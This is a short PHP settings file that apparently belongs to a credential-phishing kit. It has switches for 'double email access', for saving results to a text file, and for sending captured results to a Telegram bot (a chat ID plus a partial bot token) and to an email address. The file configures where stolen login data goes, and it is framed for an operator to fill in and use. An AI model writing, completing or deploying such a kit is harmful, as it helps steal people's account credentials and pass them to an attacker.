<?php

$doubleemailaccess="on"; // If you want to use Double Emaill Access put on otherwise put off

$saveintotxt="no"; // If you want to save in txt file put yes otherwise put no
$sendtotelegram="yes"; // If You Want to result on Telegram put yes otherwise put no
$chat_id = ""; // Your Telegram Chat ID
$bot_url = "2013042080:"; // Your Telegram Bot Api Key
$sendtoemail="yes";// If you want to result on Email put yes otherwise put no
$email = ""; // Your Email Here :)


?>
